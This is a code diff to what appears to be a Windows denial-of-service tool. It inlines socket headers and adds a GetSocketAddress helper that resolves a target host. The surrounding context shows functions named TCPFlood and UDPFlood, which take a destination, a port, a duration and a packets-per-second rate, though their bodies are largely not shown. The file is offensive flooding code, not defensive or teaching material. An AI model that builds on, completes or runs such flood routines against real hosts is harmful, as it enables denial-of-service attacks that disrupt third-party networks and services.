@@ -1,5 +1,34 @@
 #include "Un-main.h"
-#include "hand file/Socket/Sockets.h"
+//#include "hand file/Socket/Sockets.h"
+
+#ifndef SOCKETS_H
+#define SOCKETS_H
+
+#include <ws2tcpip.h>
+//#include <winsock2.h>
+//#pragma comment(lib, "ws2_32.lib")
+
+#endif
+
+bool GetSocketAddress(char* host, sockaddr_in* address)
+{
+	struct addrinfo* result = NULL;
+	struct addrinfo* ptr = NULL;
+	struct addrinfo hints;
+
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	if (getaddrinfo(host, "http", &hints, &result)) return false;
+
+	*address = *(sockaddr_in*)(result[0].ai_addr);
+	freeaddrinfo(result);
+	return true;
+}
+
+
 
 void TCPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
 	sockaddr_in input;
@@ -51,3 +80,5 @@ void UDPFlood(char* destination, unsigned short port, int seconds, int timespers
 		closesocket(c);
 	}
 }
+
+
